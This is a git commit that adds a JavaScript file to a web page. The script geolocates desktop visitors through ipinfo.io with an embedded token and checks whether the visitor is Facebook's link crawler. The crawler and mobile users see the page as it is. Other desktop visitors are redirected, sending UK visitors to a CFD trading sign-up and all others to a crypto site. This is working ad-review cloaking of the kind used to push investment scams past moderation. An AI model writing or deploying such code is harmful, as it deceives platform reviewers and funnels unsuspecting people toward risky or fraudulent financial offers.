4fa8b2bc4590990c01cf532382af2ad680d75ecc
vautrinF <131580804+vautrinF@users.noreply.github.com>
2023-04-23 11:03:00 +0300

    Add files via upload

---
+++ script.js
@@ -0,0 +1,17 @@
+function isMobileDevice() {
+  return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
+}
+
+if (!isMobileDevice()) {
+  fetch('https://ipinfo.io/json?token=0784c654f65d07')
+    .then(response => response.json())
+    .then(data => {
+      const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
+      if (!isFacebookBot && data.country !== 'GB') {
+        document.querySelector('.blue-page').style.display = 'none';
+        window.location.replace("https://www.cryptoacademie.net/");
+      } else if (data.country === 'GB') {
+        window.location.replace("https://cfd.fortuna-invest.com/register");
+      }
+    });
+}
